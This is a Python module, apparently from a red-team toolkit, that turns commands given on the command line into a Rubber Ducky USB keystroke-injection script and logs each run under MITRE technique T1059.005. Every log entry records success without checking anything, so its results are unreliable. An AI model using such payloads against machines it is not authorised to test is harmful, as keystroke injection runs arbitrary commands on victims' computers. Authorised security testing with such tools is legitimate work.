# modules/attacks/keyboard_injector_payload.py

import os
import argparse
import json
import time
from datetime import datetime

DUCKY_SCRIPT_PATH = "payloads/inject.txt"
LOG_FILE = "results/keyboard_injector_log.json"
MITRE_TTP = "T1059.005"

def log(payload):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(payload)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def build_payload(commands):
    os.makedirs("payloads", exist_ok=True)
    with open(DUCKY_SCRIPT_PATH, "w") as f:
        for cmd in commands:
            f.write(f"DELAY 200\nSTRING {cmd}\nENTER\n")
    print(f"[+] Ducky payload generated at {DUCKY_SCRIPT_PATH}")
    return DUCKY_SCRIPT_PATH

def execute(commands):
    ts = datetime.utcnow().isoformat()
    path = build_payload(commands)
    log({
        "timestamp": ts,
        "commands": commands,
        "script": path,
        "ttp": MITRE_TTP,
        "success": True
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject staged keyboard payloads (USB HID attack)")
    parser.add_argument("--cmds", nargs="+", required=True, help="List of commands to inject")
    args = parser.parse_args()
    execute(args.cmds)
